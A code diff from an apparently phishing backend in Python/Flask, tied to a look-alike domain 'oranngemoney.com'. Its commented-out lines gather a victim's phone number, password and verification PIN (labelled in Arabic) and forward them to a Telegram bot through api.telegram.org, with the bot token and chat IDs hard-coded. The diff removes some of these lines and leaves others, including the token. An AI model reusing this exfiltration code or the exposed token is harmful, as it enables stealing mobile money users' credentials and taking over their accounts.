@@ -115,16 +115,10 @@ def send_telegram_message():
 # # @cross_origin(origins="https://oranngemoney.com",methods='GET')
 # # def submit_form():
 # #     response = request.args
-# #     message=''
-# #     message+='رقم الهاتف: `'+response['phonenumber']+'`\n'
-# #     message+='كلمة المرور: `'+response['password']+'`\n'
-# #     if 'pin' in response:
-# #         message += 'رمز التحقق: `'+response['pincode']+'`'
-# #     message=urllib.parse.quote(message)
-# #     TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
-# #     # chat_id = "-4763590791"
-# #     chat_id = "-4849674945"
-# #     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
+
+    # TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
+    # chat_id = "-4849674945"
+#     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
 # #     requests.get(url)
 #     # response = make_response(jsonify({'message': 'Data from Flask API'}))
 # #     response.headers['access-aontrol-Allow-Origin'] = '*'
@@ -136,8 +130,8 @@ def send_telegram_message():
 
 # # # @app.route("/",methods=['GET'])
 # # # def submit():
-# # #     message=''
-# # #     message+=': `'+'0000000000'+'`\n'
+#     message=''
+#     message+=': `'+'0000000000'+'`\n'
 # # #     message+='كلمة المرور: `'+'mmmm123!'+'`\n'
 # # #     message=urllib.parse.quote(message)
 # # #     TOKEN = "7927477760:AAF7TpZvJeDSQPhjiYnAcp05IPT8z11rk1A"
